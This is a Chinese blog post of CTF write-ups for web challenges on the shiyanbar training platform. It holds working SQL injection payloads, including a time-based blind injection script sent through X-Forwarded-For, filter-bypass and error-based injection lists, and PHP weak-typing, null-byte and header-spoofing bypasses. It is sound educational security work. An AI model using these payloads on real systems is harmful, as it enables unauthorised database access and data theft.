---
title: shiyanbar-writeup
date: 2017-10-02 00:00:37
tags:
  - CTF
  - 信息安全
  - web安全
  - write-up
categories: 信息安全
---

最近想参加CTF的比赛，于是国庆放假做一下实验吧的web部分题目 并简单做个记录，并非完全是自己的writeup吧 和别人共同讨论吧！

<!-- more -->

## 登陆一下好吗??

> 不要怀疑,我已经过滤了一切,还再逼你注入,哈哈哈哈哈!

题干给出这些提示，尝试一些注入关键字
`union`、`or`、`||`、`select`、`#`、`--`、`//` 等等这些字符均被过滤 大小写无用
但是`'`并未过滤 初步认为这应该不是一个寻常的SQL注入题吧？猜测SQL语句应该为

```
select * from admin where username="$_POST['u']" and password="$_POST['p']"
```

而后和朋友讨论后 得出

```
select * from admin where username=''='' and password=''=''
```

其实语句就变成了这样

```
select * from admin where 1 and 1
```

提交`'='`后得flag，并显示所有的username和password

## who are you?

> 我要把攻击我的人都记录db中去!

打开页面显示 **your ip is :x.x.x.x**

初步猜测后端代码获取访问者的ip并插入到数据库中，于是尝试修改提交header中的xff字段注入

[![sql test](https://isky0t.github.io/images/shiyanbar01sql.png)](https://isky0t.github.io/images/shiyanbar01sql.png)

经过测试发现存在注入，和猜测的没错，只不过这里不能用`if(expr1,expr2,expr3)`函数，因为遇到`,`就断了。应该是和insert中的冲突了吧，于是只能用两个and来判断 ，决定尝试写个Python跑一下

```python
#!/usr/bin/env python
# encoding: utf-8

import time
import urllib2

class Main():
    url = "http://ctf5.shiyanbar.com/web/wonderkun/index.php"
    payloads = 'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'  # 所有的字符串
    result = ''  # 存放结果
    print 'Start to SQL test:'
    for i in range(1, 33):
        for payload in payloads:
            startTime = time.time()
            sql = "1.1.1.1' and (select user() like '" + result + payload + "%') and sleep(5) and '1'='1"
            sql2 = "1.1.1.1' and (select database() like '" + result + payload + "%') and sleep(5) and '1'='1"
            sql3 = "1.1.1.1' and (select case when substring((select table_name from information_schema.tables where table_schema='web4' limit 1 offset 1) from "+str(i)+" for 1)='"+payload+"' then sleep(5) else 0 end ) and '1'='1"
            sql4 = "1.1.1.1' and (select case when substring((select flag from flag) from "+str(i)+" for 1)='"+payload+"' then sleep(5) else 0 end ) and '1'='1"
            req = urllib2.Request(url)
            req.add_header('x-forwarded-for', sql4)
            f = urllib2.urlopen(req)
            if (time.time() - startTime > 5):
                result += payload
                print "tablename is " + str(i) + ": " + result
                break
                # print f.read()

if __name__ == '__main__':
    pass
```

[![user result](https://isky0t.github.io/images/shiyanbar02user.png)](https://isky0t.github.io/images/shiyanbar02user.png)

根据同样办法注入得到database为web4，但是无法用`,` 查找资料[Mysql手册](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_substring)得到无需使用逗号substr和mid的方法

### 不使用逗号

基于时间的盲注：case when xxx then sleep() else xxxx;

对于substr和mid:

```
substr(data from 1 for 1);
mid(data from 1 for 1);
```

根据这个手法手工和脚本一起使用

1. 先获取表段数 结果为2

   ```
   1.1.1.1' and (select case when (select count(*) from information_schema.tables where table_schema='web4')=2 then sleep(1) else 0 end ) and '1'='1
   ```

2. 获取第一个表段名的长度 长度为9，第二个表段长度为4（猜测是flag）

   ```
   1.1.1.1' and (select case when length((select table_name from information_schema.tables where table_schema='web4' limit 1 offset 0))=9 then sleep(1) else 0 end ) and '1'='1
   1.1.1.1' and (select case when length((select table_name from information_schema.tables where table_schema='web4' limit 1 offset 1))=4 then sleep(1) else 0 end ) and '1'='1
   ```

3. 利用脚本跑出表段名字 第一个字段名为**client_ip** 第二个字段名为**flag**

4. 获取

   flag

   表段中字段的数量、长度和内容

   ```
   字段数为1
   1.1.1.1' and (select case when (select count(column_name) from information_schema.columns where table_name='flag' and table_schema='web4')=1 then sleep(1) else 0 end ) and '1'='1
   字段名长为4
   1.1.1.1' and (select case when length((select column_name from information_schema.columns where table_name='flag' and table_schema='web4'))=4 then sleep(1) else 0 end ) and '1'='1
   猜测字段名为flag 结果正确
   1.1.1.1' and (select case when substring((select column_name from information_schema.columns where table_name='flag' and table_schema='web4') from 1 for 4)='flag' then sleep(1) else 0 end ) and '1'='1
   先获取内容长度为32  再用脚本跑出flag为cdbf14c9551d5be5612f7bb5d2867853
   1.1.1.1' and (select case when length((select flag from flag))=32 then sleep(1) else 0 end ) and '1'='1
   ```

[![flag](https://isky0t.github.io/images/shiyanbar03flag.png)](https://isky0t.github.io/images/shiyanbar03flag.png)

## 因缺思汀的绕过

> 访问解题链接去访问题目,可以进行答题。根据web题一般解题思路去解答此题。看源码，请求，响应等。提交与题目要求一致的内容即可返回flag。然后提交正确的flag即可得分。web题主要考察SQL注入，XSS等相关知识。涉及方向较多。此题主要涉及源码审计，MySQL相关的知识。

```php
<?php
error_reporting(0);

if (!isset($_POST['uname']) || !isset($_POST['pwd'])) {
	echo '<form action="" method="post">'."<br/>";
	echo '<input name="uname" type="text"/>'."<br/>";
	echo '<input name="pwd" type="text"/>'."<br/>";
	echo '<input type="submit" />'."<br/>";
	echo '</form>'."<br/>";
	echo '<!--source: source.txt-->'."<br/>";
    die;
}

function AttackFilter($StrKey,$StrValue,$ArrReq){  
    if (is_array($StrValue)){
        $StrValue=implode($StrValue);
    }
    if (preg_match("/".$ArrReq."/is",$StrValue)==1){   
        print "水可载舟，亦可赛艇！";
        exit();
    }
}

$filter = "and|select|from|where|union|join|sleep|benchmark|,|\(|\)";
foreach($_POST as $key=>$value){ 
    AttackFilter($key,$value,$filter);
}

$con = mysql_connect("XXXXXX","XXXXXX","XXXXXX");
if (!$con){
	die('Could not connect: ' . mysql_error());
}
$db="XXXXXX";
mysql_select_db($db, $con);
$sql="SELECT * FROM interest WHERE uname = '{$_POST['uname']}'";
$query = mysql_query($sql); 
if (mysql_num_rows($query) == 1) { 
    $key = mysql_fetch_array($query);
    if($key['pwd'] == $_POST['pwd']) {
        print "CTF{XXXXXX}";
    }else{
        print "亦可赛艇！";
    }
}else{
	print "一颗赛艇！";
}
mysql_close($con);
?>
```

简单说明：

```
preg_match(string $pattern , string $subject)
匹配字符串 /i不区分大小写 返回值有int(0)未匹配到 int(1)匹配到 和false匹配错误
```



大致思路：首先看过滤的关键字，那就没办法用`union`联合查询一个可控的pwd。那就把希望寄托于将`$key['pwd']==$_POST['pwd']` 构造成`null=null`的等式 ，查询资料后得到

```
group by with rollup 
对某个字段汇总（聚合）新增的一条记录字段本身内容为NULL
```



[![group by with rollup](https://isky0t.github.io/images/shiyanbar04group.png)](https://isky0t.github.io/images/shiyanbar04group.png)
构造提交payload

```
uname=' or 1=1 group by pwd with rollup limit 1 offset 2 #&pwd=
```



## 简单的sql注入

> 到底过滤了什么东西？通过注入获得flag值（提交格式：flag{}）

简单测试过滤了`and select union from where # -- informaction`等关键词
使用`/*!select*/`这样的MySQL特性绕过
构造payload得

```
1111'  /*!union*/ /*!select*/ flag /*!from*/ flag /*!where*/ '1'='1
```



[![easy sql](https://isky0t.github.io/images/shiyanbar05sqleasy.png)](https://isky0t.github.io/images/shiyanbar05sqleasy.png)

## 简单的sql注入2

> 有回显的mysql注入

简单测试后发现提交有空格就会爆`SQLi detected!`
于是用`/**/`来替换空格
构造payload得（就是在上一关的基础上替换了空格）

```
1'/**//*!union*//**//*!select*//**/flag/**//*!from*//**/flag/**//*!where*//**/'1'='1
```



得到flag发现和上一关是一样的？？？！！

## 简单的sql注入3

> mysql报错注入

简单测试后发现 `floor updatexml extractvalue`这几个关键词被过滤，于是寻找其他函数，找到一篇资料[十种MySQL报错注入](http://www.cnblogs.com/wocalieshenmegui/p/5917967.html)

```
1.floor()
select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);

2.extractvalue()
select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));

3.updatexml()
select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));

4.geometrycollection()
select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));

5.multipoint()
select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));

6.polygon()
select * from test where id=1 and polygon((select * from(select * from(select user())a)b));

7.multipolygon()
select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));

8.linestring()
select * from test where id=1 and linestring((select * from(select * from(select user())a)b));

9.multilinestring()
select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));

10.exp()
select * from test where id=1 and exp(~(select * from(select user())a));
```



于是挑选一个后提交payload，得到flag，我擦？还是和上两关一样？？？！！

```
1' and geometrycollection((select * from(select * from(select flag from flag)a)b))%23
```



## 天下武功唯快不破

> 看看响应头

从题干信息中得知查看响应头 发现`FLAG:UDBTVF9USElTX1QwX0NINE5HRV9GTDRHOjh3bHVoNXFXeQ==` 拿去base64解码后得`P0ST_THIS_T0_CH4NGE_FL4G:hjlqfHs77`
打开页面显示的是

```
There is no martial art is indefectible, while the fastest speed is the only way for long success.
>>>>>>----You must do it as fast as you can!----<<<<<<
```



应该是将flag解码后作为内容部分，而key作为参数名，重新提交到这个页面，于是写了个Python得到flag

```python
#!/usr/bin/env python
# encoding: utf-8

"""

@author: iSky0t
@time: 2017/10/4 09:16
"""


import requests

class Main():
    for i in range(1,20):

        url = "http://ctf5.shiyanbar.com/web/10/10.php"
        req = requests.get(url)
        flag = req.headers['FLAG'].decode('base64').split(':')[1]
        print flag
        payload = {'key':flag}
        req = requests.post(url,data=payload)
        print req.text



if __name__ == '__main__':
    pass
```



## 上传绕过

> bypass the upload

```
------WebKitFormBoundaryb3B5YtJ0XKn1kEpP
Content-Disposition: form-data; name="dir"

/uploads/
------WebKitFormBoundaryb3B5YtJ0XKn1kEpP
Content-Disposition: form-data; name="file"; filename="y.jpg"
Content-Type: image/vnd.microsoft.icon
```

在上传包中发现有dir的参数，先提交正确上传

> Upload: y.jpg
> Type: image/vnd.microsoft.icon
> Size: 66.060546875 Kb
> Stored in: ./uploads/8a9e5f6a7a789acb.php
> 必须上传成后缀名为php的文件才行啊！

于是在`/uploads/`处截断为`/uploads/1.php截断`，提交得到flag

## NSCTF web200

> 密文：a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws

[![NSCTF web200](http://ctf5.shiyanbar.com/web/web200.jpg)](http://ctf5.shiyanbar.com/web/web200.jpg)
可以看到这是一段简单的加密代码，大致的过程就是

- 翻转字符串
- for循环遍历字符串 将每个字母的ASCII +1 再转回字符串
- 在进行base64编码后 翻转字符串 再进行ROT13编码

那么我们简单写个脚本逆向下

```php
<?php
$encode = base64_decode(strrev(str_rot13("a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws")));
//echo $encode;
for ($i=0; $i < strlen($encode); $i++) { 
	$_c = substr($encode, $i,1);
	$__ = ord($_c)-1;
	$_c = chr($__);
	$_ = $_.$_c;
}
$decode = strrev($_);
echo $decode;
```



## PHP大法

> 注意备份文件

这个提示 我到最后也没理解有什么作用，打开网页后给出了`index.php.txt`可以查看源码

```php
<?php
if(eregi("hackerDJ",$_GET[id])) {
  echo("<p>not allowed!</p>");
  exit();
}

$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "hackerDJ")
{
  echo "<p>Access granted!</p>";
  echo "<p>flag: *****************} </p>";
}
?>
<br><br>
Can you authenticate to this website?
```



这题以前接触过，采用二次urlencode绕过就行

```
id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41
```



### urlencode

在这边顺便了解了下urlencode的方式

> **url编码解码**,又叫百分号编码，是统一资源定位(URL)编码方式。URL地址（常说网址）规定了常用地数字，字母可以直接使用，另外一批作为特殊用户字符也可以直接用（/,:@等），剩下的其它所有字符必须通过%xx编码处理。 现在已经成为一种规范了，基本所有程序语言都有这种编码，
> **编码方法:**在该字节ascii码的的16进制字符前面加%. 如 空格字符，ascii码是32，对应16进制是’20’，那么urlencode编码结果是:%20

## FALSE

> PHP代码审计
> hint：sha1函数你有认真了解过吗？听说也有人用md5碰撞o(╯□╰)o

[![false](https://isky0t.github.io/images/shiyanbar06false.png)](https://isky0t.github.io/images/shiyanbar06false.png)
利用PHP弱类型特性绕过
使得两个直接比较不相等，但是sha1相等，那只能考虑sha1为false的情况了，两个变量加密都是false，自然相等了

```
?name[]=a&password[]=b
```



## Forms

> 似乎有人觉得PIN码是不可破解的，让我们证明他是错的。

```html
<html>
    <head>
        <title>Forms</title>
    </head>
    <body>
        <form action="" method="post">
    PIN:
            <br>
            <input type="password" name="PIN" value="">
            <input type="hidden" name="showsource" value=0>
            <button type="submit">Enter</button>
        </form>
    </body>
</html>
```

发现有个隐藏的showsource的参数，猜测应该是显示源码，把value从0改成1。显示源码

```php
$a = $_POST["PIN"];
if ($a == -19827747736161128312837161661727773716166727272616149001823847) {
    echo "Congratulations! The flag is $flag";
} else {
    echo "User with provided PIN not found."; 
}
```



于是提交pin为-19827747736161128312837161661727773716166727272616149001823847 得到flag

## 程序逻辑问题

> 绕过

打开题目地址，右键源文件发现index.txt访问得到源码

```php+HTML
<html>
<head>
welcome to simplexue
</head>
<body>
<?php


if($_POST[user] && $_POST[pass]) {
	$conn = mysql_connect("********, "*****", "********");
	mysql_select_db("phpformysql") or die("Could not select database");
	if ($conn->connect_error) {
		die("Connection failed: " . mysql_error($conn));
} 
$user = $_POST[user];
$pass = md5($_POST[pass]);

$sql = "select pw from php where user='$user'";
$query = mysql_query($sql);
if (!$query) {
	printf("Error: %s\n", mysql_error($conn));
	exit();
}
$row = mysql_fetch_array($query, MYSQL_ASSOC);
//echo $row["pw"];
  
  if (($row[pw]) && (!strcasecmp($pass, $row[pw]))) {
	echo "<p>Logged in! Key:************** </p>";
}
else {
    echo("<p>Log in failure!</p>");
	
  }
  
  
}

?>
<form method=post action=index.php>
<input type=text name=user value="Username">
<input type=password name=pass value="Password">
<input type=submit>
</form>
</body>
<a href="index.txt">
</html>
```



粗略看一遍，就觉得pwd返回值可控，那么问题就能解决了

```
user提交 isky' union select '9819264afc0a223d29938073d8c2c544' as pwd#
password提交 isky
```



得到flag

## what a fuck!这是什么鬼东西?

> what a fuck!这是什么鬼东西?

访问页面 应该是 [JSfuck](http://www.jsfuck.com/)
然后在console里执行下 一个弹出框显示密码 提交之

## 忘记密码了

> 找回密码
> 解题链接： <http://ctf5.shiyanbar.com/10/upload/>

这题主要是要注意源代码中

```html
<meta name="admin" content="admin@simplexue.com" />
<meta name="editor" content="Vim" />		
```



其中包含了两个要素 第一个点为管理员的邮箱 第二个则提醒了是用vim编辑器编辑的（没注意，看了writeup才知道）
vim编辑器在编辑时会有一个临时文件 例 `submit.php`则有`.submit.php.swp`，于是访问得

```php
........这一行是省略的代码........ 
/* 如果登录邮箱地址不是管理员则 die() 数据库结构 -- 
CREATE TABLE IF NOT EXISTS `user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `token` int(255) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

-- -- 转存表中的数据 `user` -- 
INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES (1, '****不可见***', '***不可见***', 0); 

*/ ........这一行是省略的代码........ 
if(!empty($token)&&!empty($emailAddress)){
	if(strlen($token)!=10) die('fail');
	if($token!='0') die('fail');
	$sql = "SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'";
	$r = mysql_query($sql) or die('db error');
	$r = mysql_fetch_assoc($r);
	$r = $r['num'];
	if($r>0){
		echo $flag;
	}else{
		echo "失败了呀";
	}
}
```



判断token为10位且为0，又见数据库中该字段default为0，那么提交十位且为0的值就ok了
提交`0e1111111`，得到flag

## Once More

> 啊拉？又是php审计。已经想吐了。
> hint：ereg()函数有漏洞哩；从小老师就说要用科学的方法来算数。
> 解题链接： <http://ctf5.shiyanbar.com/web/more.php>

`ereg()`函数遇到`%00`会截断（**在地址栏提交**）

```php
<?php
if (isset ($_GET['password'])) {
	if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
	{
		echo '<p>You password must be alphanumeric</p>';
	}
	else if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999)
	{
		if (strpos ($_GET['password'], '*-*') !== FALSE)
		{
			die('Flag: ' . $flag);
		}
		else
		{
			echo('<p>*-* have not been found</p>');
		}
	}
	else
	{
		echo '<p>Invalid password</p>';
	}
}
?>
```



- 要求大小写字母和数字 –> 前面字母后面用`%00`截断
- 大于9999999 –> 1e8
- 包含`*-*`

于是地址栏提交，得到flag

```
http://ctf5.shiyanbar.com/web/more.php?password=1e8%00*-*
```



## 天网管理系统

> 天网你敢来挑战嘛
> 解题链接：<http://ctf5.shiyanbar.com/10/web1/>

查看源代码发现

```php+HTML
<!-- $test=$_GET['username']; $test=md5($test); if($test=='0') -->
```



对提交的username加密，加密后和0做比较，于是提交`QNKCDZO`，该字符串加密后为`0e830400451993494058024219903391`与0做`==`比较会返回相等，页面出现`/user.php?fame=hjkleffifer`放入地址栏访问，得

```php
$unserialize_str = $_POST['password'];
$data_unserialize = unserialize($unserialize_str);
if($data_unserialize['user'] == '???' && $data_unserialize['pass']=='???')
{
   print_r($flag);
}
伟大的科学家php方言道：成也布尔，败也布尔。
回去吧骚年
```

根据页面里的提示，很快想到让`$data_unserialize['user']`的值为`true`，与字符串比较还是为真，于是本地构造下序列化后的字符串为

```
a:2:{s:4:"user";b:1;s:4:"pass";b:1;}
```



最后提交用户名为该序列化字符串，密码为`QNKCDZO`，得到flag

## 貌似有点难

> 不多说，去看题目吧。
> 解题链接： <http://ctf5.shiyanbar.com/phpaudit/>

有源码可以查看

```php
<?php
function GetIP(){
if(!empty($_SERVER["HTTP_CLIENT_IP"]))
	$cip = $_SERVER["HTTP_CLIENT_IP"];
else if(!empty($_SERVER["HTTP_X_FORWARDED_FOR"]))
	$cip = $_SERVER["HTTP_X_FORWARDED_FOR"];
else if(!empty($_SERVER["REMOTE_ADDR"]))
	$cip = $_SERVER["REMOTE_ADDR"];
else
	$cip = "0.0.0.0";
return $cip;
}

$GetIPs = GetIP();
if ($GetIPs=="1.1.1.1"){
echo "Great! Key is *********";
}
else{
echo "错误！你的IP不在访问列表之内！";
}
?>
```



简单伪造个`X-FORWARDED-FOR: 1.1.1.1`的IP访问得到flag

## 头有点大

> 提示都这么多了，再提示就没意思了。
> 解题链接： <http://ctf5.shiyanbar.com/sHeader/>

```
Forbidden
 
 
You don't have permission to access / on this server.

Please make sure you have installed .net framework 9.9!

Make sure you are in the region of England and browsing this site with Internet Explorer
```

根据提示，可以看出是要修改http header来达到那些条件，分别是

- 安装.net framework 9.9!
- England
- IE浏览器访问

```
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; .NET CLR 1.1.4322; InfoPath.1; .NET CLR 9.9)
Accept-Language: en-gb
```

这个Accept-Language一开始用en试了好久，都不行，原来要用en-gb……

## 猫抓老鼠

> catch！catch！catch！嘿嘿，不多说了，再说剧透了
> 解题链接： <http://ctf5.shiyanbar.com/basic/catch/>

访问发现header里面有个

```
Content-Row:MTUwNzE3MDYxNA==
```



不用解密直接提交得到flag……

## 拐弯抹角

> 如何欺骗服务器，才能拿到Flag？
> 解题链接： <http://ctf5.shiyanbar.com/10/indirection/>

```php
<?php 
// code by SEC@USTC 

echo '<html><head><meta http-equiv="charset" content="gbk"></head><body>'; 

$URL = $_SERVER['REQUEST_URI']; 
//echo 'URL: '.$URL.'<br/>'; 
$flag = "CTF{???}"; 

$code = str_replace($flag, 'CTF{???}', file_get_contents('./index.php')); 
$stop = 0; 

//这道题目本身也有教学的目的 
//第一，我们可以构造 /indirection/a/../ /indirection/./ 等等这一类的 
//所以，第一个要求就是不得出现 ./ 
if($flag && strpos($URL, './') !== FALSE){ 
    $flag = ""; 
    $stop = 1;        //Pass 
} 

//第二，我们可以构造 \ 来代替被过滤的 / 
//所以，第二个要求就是不得出现 ../ 
if($flag && strpos($URL, '\\') !== FALSE){ 
    $flag = ""; 
    $stop = 2;        //Pass 
} 

//第三，有的系统大小写通用，例如 indirectioN/ 
//你也可以用?和#等等的字符绕过，这需要统一解决 
//所以，第三个要求对可以用的字符做了限制，a-z / 和 . 
$matches = array(); 
preg_match('/^([0-9a-z\/.]+)$/', $URL, $matches); 
if($flag && empty($matches) || $matches[1] != $URL){ 
    $flag = ""; 
    $stop = 3;        //Pass 
} 

//第四，多个 / 也是可以的 
//所以，第四个要求是不得出现 // 
if($flag && strpos($URL, '//') !== FALSE){ 
    $flag = ""; 
    $stop = 4;        //Pass 
} 

//第五，显然加上index.php或者减去index.php都是可以的 
//所以我们下一个要求就是必须包含/index.php，并且以此结尾 
if($flag && substr($URL, -10) !== '/index.php'){ 
    $flag = ""; 
    $stop = 5;        //Pass 
} 

//第六，我们知道在index.php后面加.也是可以的 
//所以我们禁止p后面出现.这个符号 
if($flag && strpos($URL, 'p.') !== FALSE){ 
    $flag = ""; 
    $stop = 6;        //Pass 
} 

//第七，现在是最关键的时刻 
//你的$URL必须与/indirection/index.php有所不同 
if($flag && $URL == '/indirection/index.php'){ 
    $flag = ""; 
    $stop = 7;        //Pass 
} 
if(!$stop) $stop = 8; 

echo 'Flag: '.$flag; 
echo '<hr />'; 
for($i = 1; $i < $stop; $i++) 
    $code = str_replace('//Pass '.$i, '//Pass', $code); 
for(; $i < 8; $i++) 
    $code = str_replace('//Pass '.$i, '//Not Pass', $code); 


echo highlight_string($code, TRUE); 

echo '</body></html>';
```

这题在看了之后，我顺手输入了一个index.php 就直接把flag显示了？？不懂什么鬼，而后又查看了别人的writeup，貌似这题考的本意是利用伪静态技术，访问`/index.php/index.php`来达到绕过的目的

## 让我进去

> 相信你一定能拿到想要的
> Hint:你可能希望知道服务器端发生了什么。。
> 格式：CTF{}
> 解题链接： <http://ctf5.shiyanbar.com/web/kzhan.php>

尝试提交，发现返回header的cookie中有

```
Set-Cookie: sample-hash=571580b26c65f306376d4f64e53cb5c7;
Set-Cookie: source=0;
```



尝试把source的值修改为1，提交 显示了源码

```php
$flag = "XXXXXXXXXXXXXXXXXXXXXXX";
$secret = "XXXXXXXXXXXXXXX"; // This secret is 15 characters long for security!

$username = $_POST["username"];
$password = $_POST["password"];

if (!empty($_COOKIE["getmein"])) {
    if (urldecode($username) === "admin" && urldecode($password) != "admin") {
        if ($COOKIE["getmein"] === md5($secret . urldecode($username . $password))) {
            echo "Congratulations! You are a registered user.\n";
            die ("The flag is ". $flag);
        }
        else {
            die ("Your cookies don't match up! STOP HACKING THIS SITE.");
        }
    }
    else {
        die ("You are not an admin! LEAVE.");
    }
}

setcookie("sample-hash", md5($secret . urldecode("admin" . "admin")), time() + (60 * 60 * 24 * 7));

if (empty($_COOKIE["source"])) {
    setcookie("source", 0, time() + (60 * 60 * 24 * 7));
}
else {
    if ($_COOKIE["source"] != 0) {
        echo ""; // This source code is outputted here
    }
}
```



尝试了好久绕过`!=`但是均不成功，后来查看writeup得知是要利用到[**hash拓展攻击**](http://www.freebuf.com/articles/database/137129.html)的知识，不在这展开，后续深入拓展
